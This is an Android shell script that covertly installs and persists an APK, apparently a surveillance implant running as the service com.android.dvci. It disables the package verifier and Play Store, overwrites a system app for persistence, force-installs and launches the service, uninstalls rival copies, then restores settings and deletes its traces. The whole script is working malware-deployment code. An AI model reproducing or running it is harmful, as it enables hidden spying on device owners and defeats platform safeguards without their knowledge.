export LD_LIBRARY_PATH=/vendor/lib:/system/lib

rm /data/local/tmp/adb-tmp.apk
cat /data/data/*/app_qza/core.*.apk > /data/local/tmp/adb-tmp.apk
chmod 666 /data/local/tmp/adb-tmp.apk

settings put global package_verifier_enable 0
pm disable com.android.vending
sleep 1

#check persistency
for i in  `ls /system/app/StkDevice* 2>/dev/null`;
do
/system/bin/ddf blw
cat  /data/local/tmp/adb-tmp.apk > /system/app/StkDevice.apk
#rm /data/local/tmp/adb-tmp.apk
/system/bin/ddf blr
break
done

#install normally, if /data/local/tmp/adb-tmp.apk isn't present
#normal install not required
#for i in  `ls /data/local/tmp/adb-tmp.apk 2>/dev/null`;
#do
pm install -r -f /data/local/tmp/adb-tmp.apk
#break
#done
sleep 2

# correctly installed
am startservice com.android.dvci/.ServiceMain
am broadcast -a android.intent.action.USER_PRESENT

for geb in $(ls /data/data/*/files/geb); do
	init=${geb#/data/data/}
    package=${init%%/*}

    if [ "$package" != "com.android.dvci" ]; then
	    pm disable $package
	    pm uninstall $package
	fi
done

sleep 2
settings put global package_verifier_enable 1
pm enable com.android.vending

rm /data/local/tmp/adb-tmp.apk
rm -r /sdcard/.lost.found
